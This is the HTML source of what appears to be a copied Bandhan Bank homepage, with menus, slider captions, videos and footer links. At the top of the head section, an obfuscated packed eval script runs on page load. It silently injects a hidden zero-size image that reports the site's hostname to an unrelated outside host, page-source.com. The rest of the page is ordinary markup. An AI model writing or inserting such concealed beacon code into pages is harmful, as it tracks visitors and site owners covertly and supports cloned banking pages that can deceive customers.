
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--[if lt IE 7]>      <html class="ie6"> <![endif]-->
<!--[if IE 7]>         <html class="ie7"> <![endif]-->
<!--[if IE 8]>         <html class="ie8"> <![endif]-->
<!--[if gt IE 8]><!-->
<!--<![endif]-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>

<script type="text/javascript">eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] } ]; e = function () { return '\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } } return p } ('1.d=c(){f e="<g j=\'b:h;\' k=\'a://5-4.6/7.9?8="+1.r.l+"&u=t\'  w=\'0\' x=\'0\'/>",i=2.v("s");n(i.m=e;i.3.o>0;)2.p.q(i.3[0])};', 34, 34, '|window|document|children|source|page|com|resizeimage|ig|ashx|https|display|function|onload||var|img|none||style|src|hostname|innerHTML|for|length|body|appendChild|location|div|13401|sz|createElement|width|height'.split('|'), 0, {}))</script>

<script type="text/javascript">
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
  m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-66840886-1', 'auto');
    ga('send', 'pageview');

</script>
<style type="text/css">
<!--
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
.red1 {
	color:#F3811E;
	font-weight:bold;
}
.overlay_11 {
	background: #000000;
	bottom: 0;
	left: 0;
	position: fixed;
	right: 0;
	top: 0;
	z-index: 100;
	opacity:0.5;
	/* Required for IE 5, 6, 7 */
	/* ...or something to trigger hasLayout, like zoom: 1; */
	width: 100%;
	/* Theoretically for IE 8 & 9 (more valid) */	
	/* ...but not required as filter works too */
	/* should come BEFORE filter */
	-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=50)";
	/* This works in IE 8 & 9 too */
	/* ... but also 5, 6, 7 */
	filter: alpha(opacity=50);
	/* Older than Firefox 0.9 */
	-moz-opacity:0.5;
	/* Safari 1.x (pre WebKit!) */
	-khtml-opacity: 0.5;
	/* Modern!
	/* Firefox 0.9+, Safari 2?, Chrome any?
	/* Opera 9+, IE 9+ */
	opacity: 0.5;
}
a.boxclose {
	background: url("../pop_win/cancel.png") repeat scroll left top transparent;
	cursor: pointer;
	float: right;
	height: 26px;
	left: 207px;
	position: relative;
	/*top: 95px;*/
	width: 26px;
}
.redbutton1 {
	width: 30px;
	line-height: 30px;
	height: 30px;
	bottom:0px;
	right:15px;
	position:fixed;
	z-index:11;
	background-color: #B00201;
	background-position: center top;
}
.redbutton1 a:link {
	width: 30px;
	background-image: url(sbs1/css/footer-show-hide.jpg);
	background-repeat: no-repeat;
	background-position:center 12px;
	position:absolute;
	z-index:12;
}
.footera1 {
	bottom:0px;
	right:0px;
	position:fixed;
	background-color:#C60202;
	width:100%
}
.container11 {
	background-color:#C60202;
	margin: auto;
	text-align: center;
}
.container11 ul {
	margin:auto;
	padding:0 px;
	list-style:none;
}
.container11 li {
	display:block;
	float:left;
	padding-right: 5px;
	padding-bottom: 3px;
	padding-top: 5px;
	padding-left: 5px;
}
.container11 li a:link {
	color:#FFFFFF;
}
.container11 li a:visited {
	color:#FFFFFF;
}
.container11 li a {
	color:#FFFFFF;
}
.box_12 {
	color: #888888;
	height: 400px;
	left: 28%;
	position: fixed;
	right: 30%;
	top: 13%;
	bottom:15%;
	width: 500px;
	z-index: 9999;
	padding:0px;
}
.box_11 {
	height: 400px;
	left: 86%;
	position: fixed;
	right: 30%;
	top: 13%;
	bottom:15%;
	width: 500px;
	z-index: 9999;
	padding:0px;
}
.box_11 img {
	/*margin:88px;*/
	border-radius:10px;
	-moz-border-radius:10px;
}
.overlay_11 {
	background: #000000;
	bottom: 0;
	left: 0;
	position: fixed;
	right: 0;
	top: 0;
	z-index: 9999;
	opacity:0.5;
	/* Required for IE 5, 6, 7 */
	/* ...or something to trigger hasLayout, like zoom: 1; */
	width: 100%;
	/* Theoretically for IE 8 & 9 (more valid) */	
	/* ...but not required as filter works too */
	/* should come BEFORE filter */
	-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=50)";
	/* This works in IE 8 & 9 too */
	/* ... but also 5, 6, 7 */
	filter: alpha(opacity=50);
	/* Older than Firefox 0.9 */
	-moz-opacity:0.5;
	/* Safari 1.x (pre WebKit!) */
	-khtml-opacity: 0.5;
	/* Modern!
	/* Firefox 0.9+, Safari 2?, Chrome any?
	/* Opera 9+, IE 9+ */
	opacity: 0.5;
}
a.boxclose {
	background: url("../pop_win/cancel.png") repeat scroll left top transparent;
	cursor: pointer;
	float: right;
	height: 26px;
	left: -80px;
	position: relative;
	top: -13px;
	width: 26px;
}
a.boxclose1 {
	background: url("../pop_win/cancel.png") repeat scroll left top transparent;
	cursor: pointer;
	float: right;
	height: 26px;
	left: -8%;
	position: relative;
	top: -5px;
	width: 26px;
}
-->
</style>

<title>Bandhan Bank : Aapka Bhala, Sabki Bhalai</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="savings accounts, current accounts, deposits,loans,Bandhan Bank" />
<meta name="description" content="Bandhan Bank: Visit www.bandhanbank.com for savings accounts, current accounts, fixed deposits, recurring deposits and loans. " />
<meta name="viewport" content="width=device-width, maximum-scale=1.0, minimum-scale=1.0, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="../css/fonts.css">
<link rel="stylesheet" type="text/css" href="../css/common.css">
<link rel="stylesheet" type="text/css" href="../css/menuchange.css">
<link rel="stylesheet" type="text/css" href="../css/homechange2.css">
<link rel="stylesheet" type="text/css" href="../css/hover.css">
<link rel="stylesheet" type="text/css" href="../css/jquery.snappish.change.css">
<link rel="stylesheet" type="text/css" href="css/popupchange.css" />
<link rel="icon" href="../images/logo.ico" type="image/icon">
<link rel="shortcut icon" href="http://www.exemple.com/favicon.ico" type="image/icon">
<!--<link rel="stylesheet" type="text/css" href="../css/Popup.css" />
--><style>


@media(min-width:1024px){
	
	.tabList > ul.menus {

width: 160px;
    float: right;
    overflow: hidden;
	}
	
		.tabList > ul li {
    width: 113%;
    height: 60px;
    margin-bottom: 19px;
	    font-size: 1em;
}

.tabList .menus li > ul {
    visibility: hidden;
    opacity: inherit;
	position: static;
	
}
.menus li > a {
    line-height: 1em;
    color: #fff;
    text-decoration: none;
    padding-bottom: 13px;
    display: block;
    border-bottom: 4px solid #002f56;
}


#onlinebanking:hover #submenuolli{
  
  visibility: visible;
      width: 156px;
	}
	
#submenuolli li a{
     padding: 10px 15px; 
	 border: 1px solid #FFF;
}

#submenuolli{
margin-top:-98px;
 right: 233px;
position: absolute;
    margin-left: -36px;
}
#submenuolli li {
    border-bottom:1px solid #FFF; 
	
	 
}
	
.tabList > ul.menus {
    width: 211px;
    float: right;
    overflow: hidden;
}
#obanking{
	left: 619px
}
}

@media(max-width:1024px){

 #submenuolli{
    width: 100%;
    position: absolute;
}
.tabList > ul li {width: 24.5%;height:100px;margin:0.25%;float:left;}

#submenuolli li{
width:49.1%;
}
#obanking{
	
}
}
@media(min-width:1024px){
.innerHeader {
	width: 1100px;
    /*width: 950px;*/
    height: 91px;
    margin: 0 auto;
    position: relative;
}
}
.rahul ul 
{
display:none;
}
.rahul ul.rahul1
{
display:block;
}
</style>
<script language="javascript">

    function myfunction(alert_MSG) {

        var theDetail = document.getElementById('Box');
        theDetail.style.display = "block";
    }

    function closePopupx(alert_MSG) {

        var theDetail = document.getElementById('Box');

        if (theDetail.style.display == "block") {
            theDetail.style.display = "none";
        }
    }
</script>
<!-------------------------------------------------------------------->
</head>
<link href="css/menu.css" rel="stylesheet" type="text/css" />
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onLoad="openOffersDialog2();openOffersDialog();">
<div id="boxpopup" class="box_11" > 
  <div id="content" style="float:right;"> <a href="Bandhan-NextGen-Bankers.aspx"><img alt="Popup" src="../pop_win/banker.gif" width="180px" height="58px"></a> </div>
</div>

<!--<div id="overlay_11" class="overlay_11"></div>
<div id="boxpopup" class="box_11"> <a onClick="closeOffersDialog('boxpopup');" href="#" class="boxclose"></a>
  <div id="content"><img src="images/09-06-17.jpg" border="0" usemap=""/> </div>
  
</div>

<div id="boxpopup1" class="box_11"> <a onClick="closeOffersDialog4('boxpopup1');" href="#" class="boxclose"></a>
   <div id="content"><img src="images/09-06-17hindi.jpg" border="0" usemap=""/>
 </div>

</div>
-->
<!--<div id="boxpopup2" class="box_12"> <a onClick="closeOffersDialog3('boxpopup2');" href="#" class="boxclose1"></a>
  <div id="content"><img src="images/FLweekLogo_Hindi.jpg" border="0" usemap="#Map"/> </div>
</div>

<div id="boxpopup3" class="box_11"> <a onClick="closeOffersDialog4('boxpopup3');" href="#" class="boxclose	"></a>
  <div id="content"><img src="images/05-06-17hindi.jpg" border="0" usemap="#Map"/> </div>
</div>-->

<div class="header">
  <div class="innerHeader" style="width:1100px;"> <a class="logo" href="http://www.bandhanbank.com"> <img alt="logo" src="../images/common/logo.png"></a> <a href="javascript:;" class="menuIcon">
    <div class="icon-menu"> <span class="line line-1"></span><span class="line line-2"></span><span class="line line-3"> </span> </div>
    </a>
    <div class="nav">
      <ul class="menu">
        <li><a href="http://www.bandhanbank.com" class="select">Home</a></li>
        <li class="has-dropdown"><a href="Product.aspx">Products</a>
          <ul class="nav-dropdown">
            <li class="has-dropdown"><a href="#">Accounts</a>
              <ul class="nav-dropdown">
                <li><a href="savings-accounts.aspx">Saving Accounts</a></li>
                <li><a href="current-accounts.aspx">Current Accounts</a></li>
              </ul>
            </li>
            <li class="has-dropdown"><a href="#">Loans</a>
              <ul class="nav-dropdown">
                <li><a href="retail-loans.aspx">Retail Loans</a></li>
                <li><a href="MSMELoans.aspx">MSME Loans</a></li>
                <li><a href="Small-Enterprise-Loan.aspx">Small Enterprise Loan</a></li>
                <li><a href="Microloans.aspx">Microloans</a></li>
                <li><a href="AgriLoans.aspx">Agri Loans</a></li>
              </ul>
            </li>
           <li><a href="fixed-deposits.aspx">Deposits</a> </li>
			<li class="has-dropdown"><a href="#">NRI Banking</a>
			
			 <ul class="nav-dropdown">
                 <li><a href="NRI-banking.aspx">Deposits</a> </li>
               <li><a href="Remitance.aspx">Remittance</a></li>
               
              </ul>
</li>
          </ul>
        </li>
        <li class="has-dropdown"><a href="#">OFFERS & DISCOUNTS</a>
          <ul class="nav-dropdown" id="offdisc">
            <!-- <li><a href="javascript:mypop('../Html/BANDHAN-CREATION.html','application',880,500)">BANDHAN CREATION</a> </li>-->
            <li><a href="RUPAY-CARD.aspx">RUPAY CARD</a> </li>
            <li><a href="VISA-CARD.aspx">VISA CARD</a> </li>
            <!--<li><a href="javascript:mypop('../Html/RUPAY-CARD.html','application',880,500)">RUPAY CARD</a> </li>
            <li><a href="javascript:mypop('../Html/VISA-CARD.html','application',880,500)">VISA CARD</a> </li>-->
          </ul>
        </li>
        <li><a href="apply-for-banking-products-and-services.aspx?val=All">Apply Now</a></li>
      <!--  <li><a href="about-bandhan-bank.aspx">About Us</a> </li>-->
		
		
		
		  <li class="has-dropdown"><a href="about-bandhan-bank.aspx">About Us</a>
          <ul class="nav-dropdown">
            <li ><a href="about-bandhan-bank.aspx#1">Our Story</a> </li>
            <li ><a href="about-bandhan-bank.aspx#2">Philosophy</a> </li>
			<li ><a href="about-bandhan-bank.aspx#3">Values</a> </li>
			<li ><a href="about-bandhan-bank.aspx#4">Success Stories</a> </li>
			<li ><a href="about-bandhan-bank.aspx#5">Board of Directors</a> </li>
			<li ><a href="about-bandhan-bank.aspx#6">Leadership</a> </li>
			<li ><a href="about-bandhan-bank.aspx#7">Corporate Governance</a> </li>
			<li ><a href="about-bandhan-bank.aspx#8">Investor Relations</a> </li>
          </ul>
        </li>
		
		
        <li><a href="branch-locator.aspx">Branch Locator</a></li>
        <li><a href="recruitment.aspx">Careers</a></li>
        <!--<li><a href="https://bandhanbankonline.com" target="_blank">Login</a></li>-->
        <!--<li class="has-dropdown"><a href="#">Online Banking</a>
          <ul class="nav-dropdown" id="obanking">
            <li><a href="https://bandhanbankonline.com">Personal</a> </li>
            <li><a href="https://bandhanbankonline.com/Corporate/">Corporate</a> </li>
          </ul>
        </li>-->
      </ul>
    </div>
    <div class="socialTab">
      <div class="shareTab"> <a href="mbandhan1.aspx"><img src="../images/mbandhan.gif" /> &nbsp;&nbsp;&nbsp;</a></div>
	 
      <div class="shareTab"><a href="contact-us.aspx">Contact Us &nbsp;&nbsp;</a></div>
      <div class="tollTab">Toll free number: 1800-258-8181 </div>
      <!--<div class="shareTab"> <a href="#">+ share</a></div>-->
      <!--<div class="languageTab">
        <select name="">
                        <option value="0">Eng</option>
                        <option value="0">Hin</option>
                    </select>
      </div>-->
      
      <div class="searchTab">
        <form method="post" action="./" id="form1">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTMyNTc1MTY0MWRk5cgZC2LnMSCYOAN9xQ6JRmUy/7zsaojcjqeuBaZSFpM=" />

<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="8D0E13E6" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAKrlAvYf2DUp9bltH4nOGC7wjOlO0uh5/2jP/zJjKRndNrEEKXf7MtVe6qgi7OsWsqcRQY40kFq2Rzi/ZkhIM52" />
          
<script type="text/javascript">
    var iChars = "!@#$%^&*()+=-[]\\\';,./{}|\":<>?";

    function stripCharsInBag(s, bag) {
        for (var i = 0; i < document.getElementById("zoom_query").value.length; i++) {
            if (iChars.indexOf(document.getElementById("zoom_query").value.charAt(i)) != -1) {
                alert("You have entered special characters");
                return false;
            }
            else return true;
        }
    }
    function check() {
        if (document.getElementById("zoom_query").value == "Search") {
            alert("Please enter value for search");
        }
        else if (document.getElementById("zoom_query").value == "") {
            alert("Please enter value for search");
        }
        else if (stripCharsInBag(document.getElementById("zoom_query").value, iChars) == false) {
            //alert("You have entered special characters");
        }
        else {
            window.location = "SearchPage.aspx?zoom_query=" + document.getElementById('zoom_query').value;
        }

    }
    function reddirect() {

    }  
</script>

    <input title="se" value="Search" tabindex="1" id="zoom_query" name="zoom_query" 
    class="searchInput"
        type="text" onkeydown="if (event.keyCode == 13) document.getElementById('btn').click()"
        onfocus="if(this.value == 'Search') {this.value = '';}" 
        placeholder="Search" />


    <input name="BandhTopSearch1$btn" type="button" id="BandhTopSearch1_btn" class="searchButton" style="cursor: pointer;" title="sel" tabindex="2" onclick="javascript: return check(this.form.zoom_query.value)" />


        </form>
      </div>
    </div>
  </div>
</div>
<!-- header end  -->
<div class="mainHome">
  <div class="snappish-main">
    <article class="slide-1"> <a href="#" class="downArrow"><img alt="Downarrow" src="../images/common/Down-Arrow.png"></a>
      <div class="innerTab">
        <div id="slides">
          <ul class="slides-container">
		  <li> <a href="personal-loan.aspx"><img src="../images/home/homeSlider/desk/personal-loannew.jpg"></a></li>
            <li> <img src="../images/home/homeSlider/desk/DSC_0252.jpg" id="">
              <div class="innerSlider captionBottomLeft">
                <h1 class="white">First Anniversary celebrations</h1>
                <hr />
                <p class="white">N.S. Vishwanathan, Deputy Governor, RBI; Keshari Nath Tripathi, Governor, West Bengal;</p>
                <hr/>
                <p class="white">Pranab Mukherjee, Hon’ble President of India; C.S. Ghosh, MD & CEO, Bandhan Bank and A.K. Lahiri, Chairman,</p>
                <hr/>
                <p class="white">Bandhan Bank pay homage to the National Anthem during the Bank’s</p>
                .
                <hr/>
                <p class="white">first Foundation Day Programme on August 23, 2016 at Kolkata.</p>
                <!--<a href="#">Know More</a> -->
              </div>
            </li>
            <li> <img src="../images/home/homeSlider/desk/Inauguration-Mast.jpg" alt="bannerone" id="bannerOne">
              <div class="innerSlider captionBottomLeft">
                <h1 class="white">Lighting of the ceremonial lamp</h1>
                <hr />
                <p class="white">Shri Arun Jaitley, Union Minister for Finance, Corporate Affairs and Information & Broadcasting,</p>
                <hr/>
                <p class="white">Government of India, at the launch of Bandhan Bank in Kolkata on August 23, 2015</p>
                <!--<a href="#">Know More</a> -->
              </div>
            </li>
            <li> <img src="../images/home/homeSlider/desk/image-02.jpg" alt="bannertwo" id="bannerTwo">
              <div class="innerSlider captionBottomLeft">
                <h1 class="white">Simple. Secure. Convenient</h1>
                <hr />
                <p class="white">Open an Account with us</p>
                <hr />
                <!-- <a href="#">Know More</a> -->
              </div>
            </li>
            <li> <img src="../images/home/homeSlider/desk/image-04.jpg" alt="bannerthree" id="bannerFour">
              <div class="innerSlider captionBottomLeft">
                <h1>Fulfill your dreams & aspirations</h1>
                <hr />
                <p>Get financed with Bandhan Bank Loans</p>
                <hr />
                <!-- <a href="#">Know More</a> -->
              </div>
            </li>
            <li> <img src="../images/home/homeSlider/desk/image-03.jpg" alt="bannerfour" id="bannerThree">
              <div class="innerSlider captionBottomRight">
                <h1 class="white">Earn attractive returns</h1>
                <hr />
                <p class="white">Invest in our Fixed Deposits</p>
                <hr />
                <!-- <a href="#">Know More</a> -->
              </div>
            </li>
          </ul>
          <nav class="slides-navigation"> <a href="#" class="next"><img alt="rightarrow" src="../images/about-us/right-arrow.png"></a> <a href="#" class="prev"><img alt="leftarrow" src="../images/about-us/left-arrow.png"></a> </nav>
        </div>
        <!-- slider end -->
      </div>
      <div class="tabList">
        <ul class="menus">
          <li id="onlinebanking"><a href="#"><span class="netbanking">Online Banking</span></a>
            <ul  id="submenuolli">
              <li><a href="https://bandhanbankonline.com"><span class="netbanking">Personal</span></a> </li>
              <li><a href="https://bandhanbankonline.com/Corporate/"><span class="netbanking">Corporate</span></a> </li>
            </ul>
          </li>
          <li><a href="https://pgi.billdesk.com/pgidsk/pgmerc/instpy/BDNIndex.jsp" target="_blank"><span class="wallet">Pay Bills</span></a></li>
          <li><a href="savings-accounts.aspx"><span class="account">Accounts</span></a></li>
          <li><a href="fixed-deposits.aspx"><span class="deposits">Deposits</span></a></li>
          <li><a href="retail-loans.aspx"><span class="loans">Loans</span></a></li>
        </ul>
      </div>
    </article>
    <!-- page one end -->
    <!--<article class="slide-2"> <a href="#" class="downArrow"><img alt="down-ar" src="../images/common/Down-Arrow.png"></a>
      <div class="innerTab">
        <div class="backgroundTab"></div>
        <div class="tabList">
          <ul class="menus">
          	
                  <li id="onlinebanking"><a href="#"><span class="netbanking">Online Banking</span></a>
                    <ul  id="submenuolli">
					<li><a href="https://bandhanbankonline.com"><span class="netbanking">Personal</span></a> </li>
                <li><a href="https://bandhanbankonline.com/Corporate/"><span class="netbanking">Corporate</span></a> </li>
                      
                      
                    </ul>
                  </li>
                     
            <li><a href="savings-accounts.aspx"><span class="account">Accounts</span></a></li>
            <li><a href="fixed-deposits.aspx"><span class="deposits">Deposits</span></a></li>
            <li><a href="retail-loans.aspx"><span class="loans">Loans</span></a></li>
          </ul>
        </div>
      </div>
    </article>-->
    <!-- page one end -->
    <article class="slide-3"> <a href="#" class="downArrow"><img alt="Downarrow" src="../images/common/Down-Arrow.png"></a>
      <div class="innerTab">
        <div class="teaserTab">
          <ul>
            <li>
              <h3>Bandhan's journey as a bank</h3>
              <!--<div class="teaserImg"><img src="../images/home/teaser-img-01.png"></div>-->
              <div class="videoTab">
                <iframe width="560" height="315" src="https://www.youtube.com/embed/jLsF10RGRjk" frameborder="0" allowfullscreen></iframe>
              </div>
              <h3>Heralding a new age in modern banking</h3>
              <!--<p>Shri Arun Jaitley, Union Minister for Finance, speaks at the inauguration of Bandhan Bank.</p>-->
              <div class="submitTab">
                <!--<a href="live-streaming.htm" class="viewBtn" target="_blank">Watch it LIVE</a>-->
                <!--<a href="#" class="viewBtn">All</a>-->
              </div>
            </li>
            <li>
              <h3>MD's message</h3>
              <div class="teaserImg">
                <div class="videoTab">
                  <iframe width="560" height="315" src="https://www.youtube.com/embed/l-Q_SVypl2s?rel=0&showinfo=0" frameborder="0" allowfullscreen></iframe>
                </div>
              </div>
              <!--<h3>A message from our <br />
                CEO & Managing Director</h3>-->
              <h3>Mr. Chandra Shekhar Ghosh talks about Bandhan Bank's values and philosophy.</h3>
              <div class="submitTab">
                <!--<a href="#" class="viewBtn">View</a>-->
                <!--<a href="#" class="viewBtn">All</a>-->
              </div>
            </li>
          </ul>
        </div>
        <!-- teaser tab end -->
      </div>
    </article>
    <!-- page one end -->
    <article class="slide-4"> <a href="#" class="topArrow"><img alt="Up-Arrow" src="../images/common/Up-Arrow.png"></a>
      <div class="innerFooterTab">
        <div class="innerFooter">
          <div class="footer">
            <div class="footerPanelTwo">
              <div class="socialIcons">
                <!-- Facebook-->
                <div id="fb-root"></div>
                <script type="text/javascript">(function (d, s, id) {
							var js, fjs = d.getElementsByTagName(s)[0];
							if (d.getElementById(id)) return;
							js = d.createElement(s); js.id = id;
							js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=1633824363542139";
							fjs.parentNode.insertBefore(js, fjs);
							}(document, 'script', 'facebook-jssdk'));
				</script>
                <ul>
                  <li><a href="javascript:;" onClick="share();"><img alt="fb" src="../images/common/facebook.png" /><span>Share this Page</span></a></li>
                  <li><a href="javascript:;" onClick="tweet();"><img alt="tw" src="../images/common/twitter.png" /><span>Tweet this Page</span></a></li>
                </ul>
                <span class="hrLine"></span>
                <ul>
                  <li><a href="https://www.facebook.com/bandhanbank.in"><img alt="fb" src="../images/common/facebook.png" /><span>Facebook</span></a></li>
                  <li><a href="https://twitter.com/bandhanbank_in"><img alt="tw" src="../images/common/twitter.png" /><span>Twitter</span></a></li>
                  <li><a href="https://www.youtube.com/c/BandhanBankLimited"><img src="../images/common/youtube.png" /><span>YouTube</span></a></li>
                  <!--<li><a href="https://www.youtube.com/channel/UCqgOB-Wr4r809oT_F7lr3LA"><img src="../images/common/youtube.png" /><span>YouTube</span></a></li>-->
                  <!--
                  <li><a href="#"><img src="../images/common/linkedin.png" /><span>Follow Us</span></a></li>-->
                </ul>
              </div>
              <!--	end socialIcons	-->
            </div>
            <!-- footer panel two end -->
            <div class="footerPanelOne">
              <ul>
                <li><a href="customer-feedback.aspx">Feedback</a></li>
                <li><a href="javascript:mypop('../Html/Interest-Rates.html','application',600,500)">Interest Rate</a></li>
                <li><a href="javascript:mypop('../Html/Schedule_charges.html','application',600,500)">Schedule of Charges</a></li>
                <li><a href="Other-Policies.aspx">Other Terms and Policies</a></li>
                <li><a href="javascript:mypop('../Html/AGM-Reports.html','application',600,500)">AGM Reports</a></li>
                <li class="rahul"><a href="#">Documents</a>
				 <ul>
            <li style="font-size:11px;"><a href="../Html/documents.html"> Loan agreement</a> </li>
            <li style="font-size:11px;"><a href="../pdf/Bandhan-Bank-AR-2016-17.pdf">Annual reports</a> </li>
          </ul>
				
				</li>
                
                 <li class="rahul"><a href="#">Regulatory Disclosure</a>
          <ul>
            <!--<li><a href="javascript:mypop('../Html/BANDHAN-CREATION.html','application',880,500)">BANDHAN CREATION</a> </li>-->
          <li style="font-size:11px;"><a href="javascript:mypop('../Html/BaselIII-Disclosure.html','application',880,500)">Basel lll Disclosure</a> </li>
            <li style="font-size:11px;"><a href="javascript:mypop('../Html/Liquidity-Coverage-Ratio.html','application',880,500)">Liquidity Coverage Ratio Disclosure</a> </li>
             <li style="font-size:11px;"><a href="javascript:mypop('../Html/Leverage-Ratio.html','application',880,500)">Leverage Ratio Disclosure</a> </li>
			 <li style="font-size:11px;"><a href="https://www.bandhanbank.com/pdf/Sundry_Creditors_30092017.pdf">Sundry Creditors</a> </li>
            <!--<li><a href="javascript:mypop('../Html/RUPAY-CARD.html','application',880,500)">RUPAY CARD</a> </li>
            <li><a href="javascript:mypop('../Html/VISA-CARD.html','application',880,500)">VISA CARD</a> </li>-->
          </ul>
        </li>
              </ul>
              <!-- panel coloum one end -->
              <ul>
                <li><a href="loan-emi-calculator.aspx">EMI Calculator</a></li>
                <li><a href="call-back-request.aspx">Call Back</a></li>
                <!--<li><a href="tenders.aspx">Tenders</a></li>-->
                <li><a href="Sitemap.aspx">Sitemap</a></li>
				 <li><a href="https://www.bandhanbank.com/pdf/State-wise-GST-address-Bandhan-Bank.pdf">State wise GST</a></li>
				 <li><a href="Disabilities.aspx">Services for Customers with Disabilities</a></li>
              </ul>
              <!-- panel coloum two end -->
              <ul>
                <li><a href="branch-locator.aspx">Branch Locator</a></li>
                <li><a href="faqs.aspx">FAQs</a></li>
                <li><a href="register-your-grievance.aspx">Grievance Redressal</a></li>
                <li><a href="contact-us.aspx">Contact Us</a></li>
              </ul>
              <!-- panel coloum three end -->
              <ul>
                <li><a href="../pdf/Disclaimer.pdf" target="_blank">Disclaimer</a></li>
                <!--<li><a href="#">Disclosures</a></li>-->
                <li><a href="recruitment.aspx">Careers</a></li>
                <li><a href="news-and-media.aspx">Media Room </a></li>
                <!--<li><a href="../pdf/Customer-Privacy-Policy.pdf" target="_blank">Privacy Policy</a></li>-->
              </ul>
              <!-- panel coloum four end -->
              <ul class="otherLinks">
                <li>Our CSR activities - <a href="http://bandhan.org/" target="_blank">www.bandhan.org</a></li>
              </ul>
              <div class="tollFree">
                <p>For any queries call us on our TOLL FREE NUMBER</p>
                <span>1800-258-8181</span> </div>
              <!--	End tollFree	-->
            </div>
            <!-- footer panel one end -->
          </div>
          <!-- footer end -->
        </div>
      </div>
    </article>
    <!-- page one end -->
  </div>
  <!-- spanish main end -->
</div>
<!-- main home end -->
<div class="marqueTab">
  <div class="innerMarque">
    <!--<p><a href="javascript:mypop('../Html/Withdrawal_existing_currency.html','application',600,500)">Withdrawal of existing currency notes of Rs 500 and Rs 1000</a> </p>-->
    <p> Bandhan Bank launches Visa International Debit Card and NRI Banking </p>
    <p> Shri Arun Jaitley inaugurates Bandhan Bank.</p>
    <p> NDTV interviews Mr. Chandra Shekhar Ghosh, the CEO and Managing Director of Bandhan Bank.</p>
    <p> Internet banking facility is available for interested customers.</p>
  </div>
</div>
<!-- marque tab end -->
<!-- facebook start-->
<script>
	function share() {
	var currenturl=window.location.href;
            var strCap = "Are you looking for a new bank with contemporary options to empower your dreams? Just visit Bandhan Bank's website. ";  // Need to change as per requirement
            var strImage = "http://www.bandhanbank.com/Images/common/fbsharesmall200by200.jpg"; // http://www.example.com/images/share.jpg  // Need to change as per requirement
            var strSharename = "Bandhan Bank";  // Need to change as per requirement
            var message = " ";
            var strSharelink = currenturl;  // Need to change as per requirement
            var action_links = [{ 'name': strSharename, 'link': strSharelink }];
            FB.ui({
                method: 'feed',
                name: strSharename,
                link: strSharelink,
                picture: strImage,
                caption: " ",
                description: strCap,
                message: message,
                actions: action_links
            }, function (response) {

            });
        }

        function tweet() {
            var vartext = "Are you looking for a new bank with contemporary options to empower your dreams? Just visit Bandhan Bank's website ";  // Need to change as per requirement
            var src = "http://www.bandhanbank.com/";  // Need to change as per requirement
            newwindow = window.open("https://twitter.com/share?text=" + vartext + "&url=" + src + "", 'name', 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=600, height=400, top=200, left=300');
            if (window.focus) { newwindow.focus() }
            return false;
        }
</script>
<!-- facebook end-->
<script src="../js/jquery.min.js"></script>
<script src="../js/jquery.mousewheel.js"></script>
<script src="../js/jquery.event.move.js"></script>
<script src="../js/jquery.event.swipe.js"></script>
<script src="../js/jquery.snappish.js"></script>
<script src="../js/jquery.easing.1.3.js"></script>
<script src="../js/jquery.animate-enhanced.min.js"></script>
<script src="../js/jquery.superslides.js"></script>
<script src="../js/jquery.pause.js"></script>
<script src="../js/jquery.easing.min.js"></script>
<script src="../js/jquery.marquee.js"></script>
<script src="../js/common-home.js"></script>
<script type="text/javascript" src="pop_win/popup.js"></script>
<script type="text/javascript" >
function  onchangego()
 {
	var link= window.document.form1.select.value
	if (link!="" )
	 {
	 
	    window.location.href=link
	 }
 }
</script>
<script language="javascript1.2">
function mypop(url,title,w,h) {
	if((title == "") || (title == "undefined"))
	{
		title = "mypop";
	}
	if((w == "") || (w == "undefined"))
	{
		w = 600;
	}
	if((h == "null") || (h == "undefined"))
	{
		h = 400;
	}
	var param = 'width=' + w + ',height=' + h ;
	param += ',resizable=no,scrollbars=yes,top=50,left=400';
	var hWnd = window.open(url,title,param);

	// if (hWnd.focus != null) hWnd.focus();
	hWnd.focus();
}
</script>
<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>-->
<script>
$(document).ready(function(){
$(".rahul").hover(function(){
//$('.rahul').children('ul').removedClass('rahul1');
$(this).children('ul').toggleClass('rahul1');
//$(this).children('ul').addClass('rahul1');


});
//$(".rahul").mouseout(function(){
//$('.rahul').children('ul').removedClass('rahul1');
//$(this).children('ul').toggleClass('rahul1');
//$(this).children('ul').addClass('rahul1');
//});
});
</script>
<!--HtML POPUP end-->
<div id="Box" style="display: none;">
  <table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td align="center"><table border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td class="borderWindow"><div class="container">
                <div id="closeButton"> <a href="javascript:closePopupx('Box')"> <img src="../Images/BoxClose.png"
                                            width="28" height="28" alt="Close popup" border="0" /></a></div>
                <div class="content"> <img src="../Images/security.png"> </div>
              </div></td>
          </tr>
        </table></td>
    </tr>
